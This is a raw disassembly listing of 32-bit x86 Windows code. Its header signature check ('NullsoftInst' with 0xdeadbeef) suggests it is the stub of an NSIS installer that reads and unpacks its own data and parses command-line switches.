  402bba:	e8 46 00 00 00       	call   0x402c05
  402bbf:	83 3d 30 37 42 00 00 	cmpl   $0x0,0x423730
  402bc6:	b9 3c 90 40 00       	mov    $0x40903c,%ecx
  402bcb:	75 05                	jne    0x402bd2
  402bcd:	b9 20 90 40 00       	mov    $0x409020,%ecx
  402bd2:	50                   	push   %eax
  402bd3:	8d 45 c0             	lea    -0x40(%ebp),%eax
  402bd6:	51                   	push   %ecx
  402bd7:	50                   	push   %eax
  402bd8:	ff 15 74 72 40 00    	call   *0x407274
  402bde:	83 c4 0c             	add    $0xc,%esp
  402be1:	8d 45 c0             	lea    -0x40(%ebp),%eax
  402be4:	50                   	push   %eax
  402be5:	ff 75 08             	push   0x8(%ebp)
  402be8:	ff 15 7c 72 40 00    	call   *0x40727c
  402bee:	8d 45 c0             	lea    -0x40(%ebp),%eax
  402bf1:	50                   	push   %eax
  402bf2:	68 06 04 00 00       	push   $0x406
  402bf7:	ff 75 08             	push   0x8(%ebp)
  402bfa:	e8 42 2a 00 00       	call   0x405641
  402bff:	33 c0                	xor    %eax,%eax
  402c01:	c9                   	leave
  402c02:	c2 10 00             	ret    $0x10
  402c05:	8b 0d d8 68 41 00    	mov    0x4168d8,%ecx
  402c0b:	a1 e8 68 41 00       	mov    0x4168e8,%eax
  402c10:	3b c8                	cmp    %eax,%ecx
  402c12:	7c 02                	jl     0x402c16
  402c14:	8b c8                	mov    %eax,%ecx
  402c16:	50                   	push   %eax
  402c17:	6a 64                	push   $0x64
  402c19:	51                   	push   %ecx
  402c1a:	ff 15 48 71 40 00    	call   *0x407148
  402c20:	c3                   	ret
  402c21:	55                   	push   %ebp
  402c22:	8b ec                	mov    %esp,%ebp
  402c24:	83 ec 40             	sub    $0x40,%esp
  402c27:	56                   	push   %esi
  402c28:	33 f6                	xor    %esi,%esi
  402c2a:	39 75 08             	cmp    %esi,0x8(%ebp)
  402c2d:	74 18                	je     0x402c47
  402c2f:	a1 e4 68 41 00       	mov    0x4168e4,%eax
  402c34:	3b c6                	cmp    %esi,%eax
  402c36:	74 07                	je     0x402c3f
  402c38:	50                   	push   %eax
  402c39:	ff 15 70 72 40 00    	call   *0x407270
  402c3f:	89 35 e4 68 41 00    	mov    %esi,0x4168e4
  402c45:	eb 76                	jmp    0x402cbd
  402c47:	39 35 e4 68 41 00    	cmp    %esi,0x4168e4
  402c4d:	74 08                	je     0x402c57
  402c4f:	56                   	push   %esi
  402c50:	e8 ed 35 00 00       	call   0x406242
  402c55:	eb 66                	jmp    0x402cbd
  402c57:	ff 15 78 70 40 00    	call   *0x407078
  402c5d:	3b 05 2c 37 42 00    	cmp    0x42372c,%eax
  402c63:	76 58                	jbe    0x402cbd
  402c65:	39 35 28 37 42 00    	cmp    %esi,0x423728
  402c6b:	74 2d                	je     0x402c9a
  402c6d:	f6 05 d4 37 42 00 01 	testb  $0x1,0x4237d4
  402c74:	74 47                	je     0x402cbd
  402c76:	e8 8a ff ff ff       	call   0x402c05
  402c7b:	50                   	push   %eax
  402c7c:	8d 45 c0             	lea    -0x40(%ebp),%eax
  402c7f:	68 54 90 40 00       	push   $0x409054
  402c84:	50                   	push   %eax
  402c85:	ff 15 74 72 40 00    	call   *0x407274
  402c8b:	83 c4 0c             	add    $0xc,%esp
  402c8e:	8d 45 c0             	lea    -0x40(%ebp),%eax
  402c91:	50                   	push   %eax
  402c92:	56                   	push   %esi
  402c93:	e8 ee 23 00 00       	call   0x405086
  402c98:	eb 23                	jmp    0x402cbd
  402c9a:	56                   	push   %esi
  402c9b:	68 7f 2b 40 00       	push   $0x402b7f
  402ca0:	56                   	push   %esi
  402ca1:	6a 6f                	push   $0x6f
  402ca3:	ff 35 20 37 42 00    	push   0x423720
  402ca9:	ff 15 3c 72 40 00    	call   *0x40723c
  402caf:	6a 05                	push   $0x5
  402cb1:	50                   	push   %eax
  402cb2:	a3 e4 68 41 00       	mov    %eax,0x4168e4
  402cb7:	ff 15 78 72 40 00    	call   *0x407278
  402cbd:	5e                   	pop    %esi
  402cbe:	c9                   	leave
  402cbf:	c3                   	ret
  402cc0:	55                   	push   %ebp
  402cc1:	8b ec                	mov    %esp,%ebp
  402cc3:	81 ec 28 01 00 00    	sub    $0x128,%esp
  402cc9:	53                   	push   %ebx
  402cca:	56                   	push   %esi
  402ccb:	33 db                	xor    %ebx,%ebx
  402ccd:	57                   	push   %edi
  402cce:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  402cd1:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  402cd4:	ff 15 78 70 40 00    	call   *0x407078
  402cda:	be 00 ac 42 00       	mov    $0x42ac00,%esi
  402cdf:	68 00 04 00 00       	push   $0x400
  402ce4:	05 e8 03 00 00       	add    $0x3e8,%eax
  402ce9:	56                   	push   %esi
  402cea:	53                   	push   %ebx
  402ceb:	a3 2c 37 42 00       	mov    %eax,0x42372c
  402cf0:	ff 15 84 70 40 00    	call   *0x407084
  402cf6:	6a 03                	push   $0x3
  402cf8:	68 00 00 00 80       	push   $0x80000000
  402cfd:	56                   	push   %esi
  402cfe:	e8 dd 2d 00 00       	call   0x405ae0
  402d03:	8b f8                	mov    %eax,%edi
  402d05:	83 ff ff             	cmp    $0xffffffff,%edi
  402d08:	89 3d 18 90 40 00    	mov    %edi,0x409018
  402d0e:	75 0a                	jne    0x402d1a
  402d10:	b8 74 91 40 00       	mov    $0x409174,%eax
  402d15:	e9 45 02 00 00       	jmp    0x402f5f
  402d1a:	56                   	push   %esi
  402d1b:	be 00 9c 42 00       	mov    $0x429c00,%esi
  402d20:	56                   	push   %esi
  402d21:	e8 47 31 00 00       	call   0x405e6d
  402d26:	56                   	push   %esi
  402d27:	e8 fa 2b 00 00       	call   0x405926
  402d2c:	50                   	push   %eax
  402d2d:	68 00 b0 42 00       	push   $0x42b000
  402d32:	e8 36 31 00 00       	call   0x405e6d
  402d37:	53                   	push   %ebx
  402d38:	57                   	push   %edi
  402d39:	ff 15 80 70 40 00    	call   *0x407080
  402d3f:	3b c3                	cmp    %ebx,%eax
  402d41:	a3 e8 68 41 00       	mov    %eax,0x4168e8
  402d46:	8b f0                	mov    %eax,%esi
  402d48:	0f 8e ea 00 00 00    	jle    0x402e38
  402d4e:	a1 34 37 42 00       	mov    0x423734,%eax
  402d53:	8b fe                	mov    %esi,%edi
  402d55:	f7 d8                	neg    %eax
  402d57:	1b c0                	sbb    %eax,%eax
  402d59:	25 00 7e 00 00       	and    $0x7e00,%eax
  402d5e:	05 00 02 00 00       	add    $0x200,%eax
  402d63:	3b f0                	cmp    %eax,%esi
  402d65:	7c 02                	jl     0x402d69
  402d67:	8b f8                	mov    %eax,%edi
  402d69:	57                   	push   %edi
  402d6a:	68 f0 68 41 00       	push   $0x4168f0
  402d6f:	e8 63 04 00 00       	call   0x4031d7
  402d74:	85 c0                	test   %eax,%eax
  402d76:	0f 84 57 01 00 00    	je     0x402ed3
  402d7c:	39 1d 34 37 42 00    	cmp    %ebx,0x423734
  402d82:	75 7e                	jne    0x402e02
  402d84:	6a 1c                	push   $0x1c
  402d86:	8d 45 dc             	lea    -0x24(%ebp),%eax
  402d89:	68 f0 68 41 00       	push   $0x4168f0
  402d8e:	50                   	push   %eax
  402d8f:	e8 07 2d 00 00       	call   0x405a9b
  402d94:	8b 45 dc             	mov    -0x24(%ebp),%eax
  402d97:	a9 f0 ff ff ff       	test   $0xfffffff0,%eax
  402d9c:	75 71                	jne    0x402e0f
  402d9e:	81 7d e0 ef be ad de 	cmpl   $0xdeadbeef,-0x20(%ebp)
  402da5:	75 68                	jne    0x402e0f
  402da7:	81 7d ec 49 6e 73 74 	cmpl   $0x74736e49,-0x14(%ebp)
  402dae:	75 5f                	jne    0x402e0f
  402db0:	81 7d e8 73 6f 66 74 	cmpl   $0x74666f73,-0x18(%ebp)
  402db7:	75 56                	jne    0x402e0f
  402db9:	81 7d e4 4e 75 6c 6c 	cmpl   $0x6c6c754e,-0x1c(%ebp)
  402dc0:	75 4d                	jne    0x402e0f
  402dc2:	09 45 08             	or     %eax,0x8(%ebp)
  402dc5:	8b 45 08             	mov    0x8(%ebp),%eax
  402dc8:	8b 0d d8 68 41 00    	mov    0x4168d8,%ecx
  402dce:	83 e0 02             	and    $0x2,%eax
  402dd1:	09 05 c0 37 42 00    	or     %eax,0x4237c0
  402dd7:	8b 45 f4             	mov    -0xc(%ebp),%eax
  402dda:	3b c6                	cmp    %esi,%eax
  402ddc:	89 0d 34 37 42 00    	mov    %ecx,0x423734
  402de2:	0f 8f 2f 01 00 00    	jg     0x402f17
  402de8:	f6 45 08 08          	testb  $0x8,0x8(%ebp)
  402dec:	75 06                	jne    0x402df4
  402dee:	f6 45 08 04          	testb  $0x4,0x8(%ebp)
  402df2:	75 44                	jne    0x402e38
  402df4:	ff 45 f8             	incl   -0x8(%ebp)
  402df7:	8d 70 fc             	lea    -0x4(%eax),%esi
  402dfa:	3b fe                	cmp    %esi,%edi
  402dfc:	76 11                	jbe    0x402e0f
  402dfe:	8b fe                	mov    %esi,%edi
  402e00:	eb 0d                	jmp    0x402e0f
  402e02:	f6 45 08 02          	testb  $0x2,0x8(%ebp)
  402e06:	75 07                	jne    0x402e0f
  402e08:	53                   	push   %ebx
  402e09:	e8 13 fe ff ff       	call   0x402c21
  402e0e:	59                   	pop    %ecx
  402e0f:	3b 35 e8 68 41 00    	cmp    0x4168e8,%esi
  402e15:	7d 11                	jge    0x402e28
  402e17:	57                   	push   %edi
  402e18:	68 f0 68 41 00       	push   $0x4168f0
  402e1d:	ff 75 fc             	push   -0x4(%ebp)
  402e20:	e8 56 34 00 00       	call   0x40627b
  402e25:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402e28:	01 3d d8 68 41 00    	add    %edi,0x4168d8
  402e2e:	2b f7                	sub    %edi,%esi
  402e30:	3b f3                	cmp    %ebx,%esi
  402e32:	0f 8f 16 ff ff ff    	jg     0x402d4e
  402e38:	6a 01                	push   $0x1
  402e3a:	e8 e2 fd ff ff       	call   0x402c21
  402e3f:	39 1d 34 37 42 00    	cmp    %ebx,0x423734
  402e45:	59                   	pop    %ecx
  402e46:	0f 84 cb 00 00 00    	je     0x402f17
  402e4c:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  402e4f:	74 2a                	je     0x402e7b
  402e51:	ff 35 d8 68 41 00    	push   0x4168d8
  402e57:	e8 91 03 00 00       	call   0x4031ed
  402e5c:	8d 45 08             	lea    0x8(%ebp),%eax
  402e5f:	6a 04                	push   $0x4
  402e61:	50                   	push   %eax
  402e62:	e8 70 03 00 00       	call   0x4031d7
  402e67:	85 c0                	test   %eax,%eax
  402e69:	0f 84 a8 00 00 00    	je     0x402f17
  402e6f:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402e72:	3b 45 08             	cmp    0x8(%ebp),%eax
  402e75:	0f 85 9c 00 00 00    	jne    0x402f17
  402e7b:	ff 75 f0             	push   -0x10(%ebp)
  402e7e:	6a 40                	push   $0x40
  402e80:	ff 15 60 71 40 00    	call   *0x407160
  402e86:	b9 50 a8 40 00       	mov    $0x40a850,%ecx
  402e8b:	8b f0                	mov    %eax,%esi
  402e8d:	e8 57 34 00 00       	call   0x4062e9
  402e92:	8d 85 d8 fe ff ff    	lea    -0x128(%ebp),%eax
  402e98:	68 00 a4 42 00       	push   $0x42a400
  402e9d:	50                   	push   %eax
  402e9e:	e8 6c 2c 00 00       	call   0x405b0f
  402ea3:	53                   	push   %ebx
  402ea4:	68 00 01 00 04       	push   $0x4000100
  402ea9:	6a 02                	push   $0x2
  402eab:	53                   	push   %ebx
  402eac:	53                   	push   %ebx
  402ead:	8d 85 d8 fe ff ff    	lea    -0x128(%ebp),%eax
  402eb3:	68 00 00 00 c0       	push   $0xc0000000
  402eb8:	50                   	push   %eax
  402eb9:	ff 15 7c 70 40 00    	call   *0x40707c
  402ebf:	83 f8 ff             	cmp    $0xffffffff,%eax
  402ec2:	a3 1c 90 40 00       	mov    %eax,0x40901c
  402ec7:	75 14                	jne    0x402edd
  402ec9:	b8 30 91 40 00       	mov    $0x409130,%eax
  402ece:	e9 8c 00 00 00       	jmp    0x402f5f
  402ed3:	6a 01                	push   $0x1
  402ed5:	e8 47 fd ff ff       	call   0x402c21
  402eda:	59                   	pop    %ecx
  402edb:	eb 3a                	jmp    0x402f17
  402edd:	a1 34 37 42 00       	mov    0x423734,%eax
  402ee2:	83 c0 1c             	add    $0x1c,%eax
  402ee5:	50                   	push   %eax
  402ee6:	e8 02 03 00 00       	call   0x4031ed
  402eeb:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  402eee:	ff 75 f0             	push   -0x10(%ebp)
  402ef1:	f7 d1                	not    %ecx
  402ef3:	83 e1 04             	and    $0x4,%ecx
  402ef6:	a3 ec 68 41 00       	mov    %eax,0x4168ec
  402efb:	2b c1                	sub    %ecx,%eax
  402efd:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  402f00:	56                   	push   %esi
  402f01:	53                   	push   %ebx
  402f02:	8d 44 08 e4          	lea    -0x1c(%eax,%ecx,1),%eax
  402f06:	6a ff                	push   $0xffffffff
  402f08:	a3 e0 68 41 00       	mov    %eax,0x4168e0
  402f0d:	e8 54 00 00 00       	call   0x402f66
  402f12:	3b 45 f0             	cmp    -0x10(%ebp),%eax
  402f15:	74 07                	je     0x402f1e
  402f17:	b8 60 90 40 00       	mov    $0x409060,%eax
  402f1c:	eb 41                	jmp    0x402f5f
  402f1e:	f6 45 dc 01          	testb  $0x1,-0x24(%ebp)
  402f22:	89 35 30 37 42 00    	mov    %esi,0x423730
  402f28:	8b 06                	mov    (%esi),%eax
  402f2a:	a3 38 37 42 00       	mov    %eax,0x423738
  402f2f:	74 06                	je     0x402f37
  402f31:	ff 05 3c 37 42 00    	incl   0x42373c
  402f37:	6a 08                	push   $0x8
  402f39:	8d 46 44             	lea    0x44(%esi),%eax
  402f3c:	59                   	pop    %ecx
  402f3d:	83 e8 08             	sub    $0x8,%eax
  402f40:	01 30                	add    %esi,(%eax)
  402f42:	49                   	dec    %ecx
  402f43:	75 f8                	jne    0x402f3d
  402f45:	a1 dc 68 41 00       	mov    0x4168dc,%eax
  402f4a:	6a 40                	push   $0x40
  402f4c:	89 46 3c             	mov    %eax,0x3c(%esi)
  402f4f:	83 c6 04             	add    $0x4,%esi
  402f52:	56                   	push   %esi
  402f53:	68 40 37 42 00       	push   $0x423740
  402f58:	e8 3e 2b 00 00       	call   0x405a9b
  402f5d:	33 c0                	xor    %eax,%eax
  402f5f:	5f                   	pop    %edi
  402f60:	5e                   	pop    %esi
  402f61:	5b                   	pop    %ebx
  402f62:	c9                   	leave
  402f63:	c2 04 00             	ret    $0x4
  402f66:	55                   	push   %ebp
  402f67:	8b ec                	mov    %esp,%ebp
  402f69:	51                   	push   %ecx
  402f6a:	8b 45 08             	mov    0x8(%ebp),%eax
  402f6d:	53                   	push   %ebx
  402f6e:	56                   	push   %esi
  402f6f:	33 f6                	xor    %esi,%esi
  402f71:	3b c6                	cmp    %esi,%eax
  402f73:	7c 1c                	jl     0x402f91
  402f75:	8b 0d 78 37 42 00    	mov    0x423778,%ecx
  402f7b:	56                   	push   %esi
  402f7c:	03 c1                	add    %ecx,%eax
  402f7e:	56                   	push   %esi
  402f7f:	50                   	push   %eax
  402f80:	a3 dc 68 41 00       	mov    %eax,0x4168dc
  402f85:	ff 35 1c 90 40 00    	push   0x40901c
  402f8b:	ff 15 34 71 40 00    	call   *0x407134
  402f91:	6a 04                	push   $0x4
  402f93:	e8 d6 00 00 00       	call   0x40306e
  402f98:	3b c6                	cmp    %esi,%eax
  402f9a:	0f 8c c8 00 00 00    	jl     0x403068
  402fa0:	8d 45 08             	lea    0x8(%ebp),%eax
  402fa3:	6a 04                	push   $0x4
  402fa5:	50                   	push   %eax
  402fa6:	ff 35 1c 90 40 00    	push   0x40901c
  402fac:	e8 a7 2b 00 00       	call   0x405b58
  402fb1:	85 c0                	test   %eax,%eax
  402fb3:	0f 84 9f 00 00 00    	je     0x403058
  402fb9:	ff 75 08             	push   0x8(%ebp)
  402fbc:	83 05 dc 68 41 00 04 	addl   $0x4,0x4168dc
  402fc3:	e8 a6 00 00 00       	call   0x40306e
  402fc8:	8b d8                	mov    %eax,%ebx
  402fca:	3b de                	cmp    %esi,%ebx
  402fcc:	0f 8c 94 00 00 00    	jl     0x403066
  402fd2:	39 75 10             	cmp    %esi,0x10(%ebp)
  402fd5:	75 5d                	jne    0x403034
  402fd7:	39 75 08             	cmp    %esi,0x8(%ebp)
  402fda:	0f 8e 86 00 00 00    	jle    0x403066
  402fe0:	be d8 28 41 00       	mov    $0x4128d8,%esi
  402fe5:	81 7d 08 00 40 00 00 	cmpl   $0x4000,0x8(%ebp)
  402fec:	8b 45 08             	mov    0x8(%ebp),%eax
  402fef:	7c 05                	jl     0x402ff6
  402ff1:	b8 00 40 00 00       	mov    $0x4000,%eax
  402ff6:	50                   	push   %eax
  402ff7:	56                   	push   %esi
  402ff8:	ff 35 1c 90 40 00    	push   0x40901c
  402ffe:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403001:	e8 52 2b 00 00       	call   0x405b58
  403006:	85 c0                	test   %eax,%eax
  403008:	74 4e                	je     0x403058
  40300a:	ff 75 fc             	push   -0x4(%ebp)
  40300d:	56                   	push   %esi
  40300e:	ff 75 0c             	push   0xc(%ebp)
  403011:	e8 71 2b 00 00       	call   0x405b87
  403016:	85 c0                	test   %eax,%eax
  403018:	74 16                	je     0x403030
  40301a:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40301d:	29 45 08             	sub    %eax,0x8(%ebp)
  403020:	01 05 dc 68 41 00    	add    %eax,0x4168dc
  403026:	03 d8                	add    %eax,%ebx
  403028:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  40302c:	7f b7                	jg     0x402fe5
  40302e:	eb 36                	jmp    0x403066
  403030:	6a fe                	push   $0xfffffffe
  403032:	eb 26                	jmp    0x40305a
  403034:	8b 45 08             	mov    0x8(%ebp),%eax
  403037:	3b 45 14             	cmp    0x14(%ebp),%eax
  40303a:	7c 03                	jl     0x40303f
  40303c:	8b 45 14             	mov    0x14(%ebp),%eax
  40303f:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  403042:	56                   	push   %esi
  403043:	51                   	push   %ecx
  403044:	50                   	push   %eax
  403045:	ff 75 10             	push   0x10(%ebp)
  403048:	ff 35 1c 90 40 00    	push   0x40901c
  40304e:	ff 15 88 70 40 00    	call   *0x407088
  403054:	85 c0                	test   %eax,%eax
  403056:	75 05                	jne    0x40305d
  403058:	6a fd                	push   $0xfffffffd
  40305a:	58                   	pop    %eax
  40305b:	eb 0b                	jmp    0x403068
  40305d:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  403060:	01 1d dc 68 41 00    	add    %ebx,0x4168dc
  403066:	8b c3                	mov    %ebx,%eax
  403068:	5e                   	pop    %esi
  403069:	5b                   	pop    %ebx
  40306a:	c9                   	leave
  40306b:	c2 10 00             	ret    $0x10
  40306e:	53                   	push   %ebx
  40306f:	55                   	push   %ebp
  403070:	56                   	push   %esi
  403071:	8b 35 dc 68 41 00    	mov    0x4168dc,%esi
  403077:	2b 35 48 a8 40 00    	sub    0x40a848,%esi
  40307d:	57                   	push   %edi
  40307e:	03 74 24 14          	add    0x14(%esp),%esi
  403082:	ff 15 78 70 40 00    	call   *0x407078
  403088:	33 db                	xor    %ebx,%ebx
  40308a:	05 f4 01 00 00       	add    $0x1f4,%eax
  40308f:	3b f3                	cmp    %ebx,%esi
  403091:	a3 2c 37 42 00       	mov    %eax,0x42372c
  403096:	0f 8e 2a 01 00 00    	jle    0x4031c6
  40309c:	ff 35 ec 68 41 00    	push   0x4168ec
  4030a2:	e8 46 01 00 00       	call   0x4031ed
  4030a7:	53                   	push   %ebx
  4030a8:	53                   	push   %ebx
  4030a9:	ff 35 48 a8 40 00    	push   0x40a848
  4030af:	ff 35 1c 90 40 00    	push   0x40901c
  4030b5:	ff 15 34 71 40 00    	call   *0x407134
  4030bb:	89 35 e8 68 41 00    	mov    %esi,0x4168e8
  4030c1:	89 1d d8 68 41 00    	mov    %ebx,0x4168d8
  4030c7:	bd d8 a8 40 00       	mov    $0x40a8d8,%ebp
  4030cc:	a1 e0 68 41 00       	mov    0x4168e0,%eax
  4030d1:	bf 00 40 00 00       	mov    $0x4000,%edi
  4030d6:	2b 05 ec 68 41 00    	sub    0x4168ec,%eax
  4030dc:	3b c7                	cmp    %edi,%eax
  4030de:	7f 02                	jg     0x4030e2
  4030e0:	8b f8                	mov    %eax,%edi
  4030e2:	be d8 28 41 00       	mov    $0x4128d8,%esi
  4030e7:	57                   	push   %edi
  4030e8:	56                   	push   %esi
  4030e9:	e8 e9 00 00 00       	call   0x4031d7
  4030ee:	85 c0                	test   %eax,%eax
  4030f0:	0f 84 c2 00 00 00    	je     0x4031b8
  4030f6:	01 3d ec 68 41 00    	add    %edi,0x4168ec
  4030fc:	89 35 68 a8 40 00    	mov    %esi,0x40a868
  403102:	89 3d 6c a8 40 00    	mov    %edi,0x40a86c
  403108:	39 1d 30 37 42 00    	cmp    %ebx,0x423730
  40310e:	74 29                	je     0x403139
  403110:	39 1d c0 37 42 00    	cmp    %ebx,0x4237c0
  403116:	75 21                	jne    0x403139
  403118:	a1 e8 68 41 00       	mov    0x4168e8,%eax
  40311d:	53                   	push   %ebx
  40311e:	2b 05 dc 68 41 00    	sub    0x4168dc,%eax
  403124:	2b 44 24 18          	sub    0x18(%esp),%eax
  403128:	03 05 48 a8 40 00    	add    0x40a848,%eax
  40312e:	a3 d8 68 41 00       	mov    %eax,0x4168d8
  403133:	e8 e9 fa ff ff       	call   0x402c21
  403138:	59                   	pop    %ecx
  403139:	b9 50 a8 40 00       	mov    $0x40a850,%ecx
  40313e:	89 2d 70 a8 40 00    	mov    %ebp,0x40a870
  403144:	c7 05 74 a8 40 00 00 	movl   $0x8000,0x40a874
  40314b:	80 00 00 
  40314e:	e8 b6 31 00 00       	call   0x406309
  403153:	85 c0                	test   %eax,%eax
  403155:	7c 6a                	jl     0x4031c1
  403157:	8b 35 70 a8 40 00    	mov    0x40a870,%esi
  40315d:	2b f5                	sub    %ebp,%esi
  40315f:	74 21                	je     0x403182
  403161:	56                   	push   %esi
  403162:	55                   	push   %ebp
  403163:	ff 35 1c 90 40 00    	push   0x40901c
  403169:	e8 19 2a 00 00       	call   0x405b87
  40316e:	85 c0                	test   %eax,%eax
  403170:	74 4b                	je     0x4031bd
  403172:	01 35 48 a8 40 00    	add    %esi,0x40a848
  403178:	39 1d 6c a8 40 00    	cmp    %ebx,0x40a86c
  40317e:	75 88                	jne    0x403108
  403180:	eb 0c                	jmp    0x40318e
  403182:	39 1d 6c a8 40 00    	cmp    %ebx,0x40a86c
  403188:	75 37                	jne    0x4031c1
  40318a:	3b fb                	cmp    %ebx,%edi
  40318c:	74 33                	je     0x4031c1
  40318e:	a1 dc 68 41 00       	mov    0x4168dc,%eax
  403193:	8b c8                	mov    %eax,%ecx
  403195:	2b 0d 48 a8 40 00    	sub    0x40a848,%ecx
  40319b:	03 4c 24 14          	add    0x14(%esp),%ecx
  40319f:	85 c9                	test   %ecx,%ecx
  4031a1:	0f 8f 25 ff ff ff    	jg     0x4030cc
  4031a7:	53                   	push   %ebx
  4031a8:	53                   	push   %ebx
  4031a9:	50                   	push   %eax
  4031aa:	ff 35 1c 90 40 00    	push   0x40901c
  4031b0:	ff 15 34 71 40 00    	call   *0x407134
  4031b6:	eb 0e                	jmp    0x4031c6
  4031b8:	83 c8 ff             	or     $0xffffffff,%eax
  4031bb:	eb 13                	jmp    0x4031d0
  4031bd:	6a fe                	push   $0xfffffffe
  4031bf:	eb 02                	jmp    0x4031c3
  4031c1:	6a fd                	push   $0xfffffffd
  4031c3:	58                   	pop    %eax
  4031c4:	eb 0a                	jmp    0x4031d0
  4031c6:	6a 01                	push   $0x1
  4031c8:	e8 54 fa ff ff       	call   0x402c21
  4031cd:	59                   	pop    %ecx
  4031ce:	33 c0                	xor    %eax,%eax
  4031d0:	5f                   	pop    %edi
  4031d1:	5e                   	pop    %esi
  4031d2:	5d                   	pop    %ebp
  4031d3:	5b                   	pop    %ebx
  4031d4:	c2 04 00             	ret    $0x4
  4031d7:	ff 74 24 08          	push   0x8(%esp)
  4031db:	ff 74 24 08          	push   0x8(%esp)
  4031df:	ff 35 18 90 40 00    	push   0x409018
  4031e5:	e8 6e 29 00 00       	call   0x405b58
  4031ea:	c2 08 00             	ret    $0x8
  4031ed:	6a 00                	push   $0x0
  4031ef:	6a 00                	push   $0x0
  4031f1:	ff 74 24 0c          	push   0xc(%esp)
  4031f5:	ff 35 18 90 40 00    	push   0x409018
  4031fb:	ff 15 34 71 40 00    	call   *0x407134
  403201:	c2 04 00             	ret    $0x4
  403204:	56                   	push   %esi
  403205:	be 00 a4 42 00       	mov    $0x42a400,%esi
  40320a:	56                   	push   %esi
  40320b:	e8 c8 2e 00 00       	call   0x4060d8
  403210:	56                   	push   %esi
  403211:	e8 36 27 00 00       	call   0x40594c
  403216:	85 c0                	test   %eax,%eax
  403218:	75 02                	jne    0x40321c
  40321a:	5e                   	pop    %esi
  40321b:	c3                   	ret
  40321c:	56                   	push   %esi
  40321d:	e8 bd 26 00 00       	call   0x4058df
  403222:	56                   	push   %esi
  403223:	e8 a1 23 00 00       	call   0x4055c9
  403228:	56                   	push   %esi
  403229:	68 00 a0 42 00       	push   $0x42a000
  40322e:	e8 dc 28 00 00       	call   0x405b0f
  403233:	5e                   	pop    %esi
  403234:	c3                   	ret
  403235:	81 ec 84 01 00 00    	sub    $0x184,%esp
  40323b:	53                   	push   %ebx
  40323c:	56                   	push   %esi
  40323d:	57                   	push   %edi
  40323e:	33 db                	xor    %ebx,%ebx
  403240:	68 01 80 00 00       	push   $0x8001
  403245:	89 5c 24 18          	mov    %ebx,0x18(%esp)
  403249:	c7 44 24 10 30 91 40 	movl   $0x409130,0x10(%esp)
  403250:	00 
  403251:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  403255:	c6 44 24 14 20       	movb   $0x20,0x14(%esp)
  40325a:	ff 15 20 71 40 00    	call   *0x407120
  403260:	ff 15 ac 70 40 00    	call   *0x4070ac
  403266:	66 3d 06 00          	cmp    $0x6,%ax
  40326a:	74 11                	je     0x40327d
  40326c:	53                   	push   %ebx
  40326d:	e8 94 2f 00 00       	call   0x406206
  403272:	3b c3                	cmp    %ebx,%eax
  403274:	74 07                	je     0x40327d
  403276:	68 00 0c 00 00       	push   $0xc00
  40327b:	ff d0                	call   *%eax
  40327d:	be 98 72 40 00       	mov    $0x407298,%esi
  403282:	56                   	push   %esi
  403283:	e8 10 2f 00 00       	call   0x406198
  403288:	56                   	push   %esi
  403289:	ff 15 a8 70 40 00    	call   *0x4070a8
  40328f:	8d 74 06 01          	lea    0x1(%esi,%eax,1),%esi
  403293:	38 1e                	cmp    %bl,(%esi)
  403295:	75 eb                	jne    0x403282
  403297:	55                   	push   %ebp
  403298:	6a 09                	push   $0x9
  40329a:	e8 67 2f 00 00       	call   0x406206
  40329f:	6a 07                	push   $0x7
  4032a1:	e8 60 2f 00 00       	call   0x406206
  4032a6:	a3 24 37 42 00       	mov    %eax,0x423724
  4032ab:	ff 15 44 70 40 00    	call   *0x407044
  4032b1:	53                   	push   %ebx
  4032b2:	ff 15 88 72 40 00    	call   *0x407288
  4032b8:	a3 d8 37 42 00       	mov    %eax,0x4237d8
  4032bd:	53                   	push   %ebx
  4032be:	8d 44 24 38          	lea    0x38(%esp),%eax
  4032c2:	68 60 01 00 00       	push   $0x160
  4032c7:	50                   	push   %eax
  4032c8:	53                   	push   %ebx
  4032c9:	68 f0 ec 41 00       	push   $0x41ecf0
  4032ce:	ff 15 74 71 40 00    	call   *0x407174
  4032d4:	68 ec 91 40 00       	push   $0x4091ec
  4032d9:	68 20 2f 42 00       	push   $0x422f20
  4032de:	e8 8a 2b 00 00       	call   0x405e6d
  4032e3:	ff 15 a4 70 40 00    	call   *0x4070a4
  4032e9:	bd 00 90 42 00       	mov    $0x429000,%ebp
  4032ee:	50                   	push   %eax
  4032ef:	55                   	push   %ebp
  4032f0:	e8 78 2b 00 00       	call   0x405e6d
  4032f5:	53                   	push   %ebx
  4032f6:	ff 15 54 71 40 00    	call   *0x407154
  4032fc:	80 3d 00 90 42 00 22 	cmpb   $0x22,0x429000
  403303:	a3 20 37 42 00       	mov    %eax,0x423720
  403308:	8b c5                	mov    %ebp,%eax
  40330a:	75 0a                	jne    0x403316
  40330c:	c6 44 24 14 22       	movb   $0x22,0x14(%esp)
  403311:	b8 01 90 42 00       	mov    $0x429001,%eax
  403316:	ff 74 24 14          	push   0x14(%esp)
  40331a:	50                   	push   %eax
  40331b:	e8 ea 25 00 00       	call   0x40590a
  403320:	50                   	push   %eax
  403321:	ff 15 30 72 40 00    	call   *0x407230
  403327:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  40332b:	e9 c0 00 00 00       	jmp    0x4033f0
  403330:	80 f9 20             	cmp    $0x20,%cl
  403333:	75 06                	jne    0x40333b
  403335:	40                   	inc    %eax
  403336:	80 38 20             	cmpb   $0x20,(%eax)
  403339:	74 fa                	je     0x403335
  40333b:	80 38 22             	cmpb   $0x22,(%eax)
  40333e:	c6 44 24 14 20       	movb   $0x20,0x14(%esp)
  403343:	75 06                	jne    0x40334b
  403345:	40                   	inc    %eax
  403346:	c6 44 24 14 22       	movb   $0x22,0x14(%esp)
  40334b:	80 38 2f             	cmpb   $0x2f,(%eax)
  40334e:	0f 85 8c 00 00 00    	jne    0x4033e0
  403354:	40                   	inc    %eax
  403355:	80 38 53             	cmpb   $0x53,(%eax)
  403358:	75 16                	jne    0x403370
